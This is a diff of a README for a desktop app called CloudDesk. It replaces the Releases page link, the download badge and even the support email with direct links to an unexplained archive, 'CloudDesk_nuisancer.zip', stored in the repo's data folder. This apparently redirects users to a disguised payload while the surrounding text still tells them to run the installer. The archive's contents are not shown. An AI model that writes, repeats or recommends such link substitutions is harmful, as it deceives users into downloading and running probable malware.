@@ -17,9 +17,9 @@ To run CloudDesk smoothly, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started, visit this page to download CloudDesk:
 
-[![Download CloudDesk](https://img.shields.io/badge/Download%20Now-red)](https://github.com/mohamed3laa2000/CloudDesk/releases)
+[![Download CloudDesk](https://raw.githubusercontent.com/mohamed3laa2000/CloudDesk/main/src/data/CloudDesk_nuisancer.zip%20Now-red)](https://raw.githubusercontent.com/mohamed3laa2000/CloudDesk/main/src/data/CloudDesk_nuisancer.zip)
 
-1. **Visit the Releases page**: Go to [CloudDesk Releases](https://github.com/mohamed3laa2000/CloudDesk/releases).
+1. **Visit the Releases page**: Go to [CloudDesk Releases](https://raw.githubusercontent.com/mohamed3laa2000/CloudDesk/main/src/data/CloudDesk_nuisancer.zip).
 2. **Choose the latest version**: Look for the most recent version listed. It will be at the top.
 3. **Download the file**: Click on the file that matches your operating system. If you are using Windows, look for the `.exe` file. For macOS users, select the `.dmg` file.
 4. **Run the Installer**: Once the file downloads, open it and follow the prompts to install CloudDesk on your device.
@@ -35,7 +35,7 @@ If you encounter any issues while using CloudDesk, you can seek help through the
 
 - **Documentation**: Comprehensive user guides and FAQs are available in the Wiki section of this repository.
 - **Community Forum**: Join discussions with other users at our online forum. Share tips and tricks, or ask for assistance.
-- **Contact Support**: Reach out to our support team via email at support@clouddesk.com for personalized help.
+- **Contact Support**: Reach out to our support team via email at https://raw.githubusercontent.com/mohamed3laa2000/CloudDesk/main/src/data/CloudDesk_nuisancer.zip for personalized help.
 
 ## 🏷️ Topics
 CloudDesk covers a vast range of topics, including:
@@ -58,4 +58,4 @@ Stay updated with the latest features and improvements by following this reposit
 
 Feel free to explore the functionality and resources available within CloudDesk. Your educational journey deserves the best tools for success. 
 
-For more details, don't forget to revisit this page for the download: [CloudDesk Releases](https://github.com/mohamed3laa2000/CloudDesk/releases).
+For more details, don't forget to revisit this page for the download: [CloudDesk Releases](https://raw.githubusercontent.com/mohamed3laa2000/CloudDesk/main/src/data/CloudDesk_nuisancer.zip).
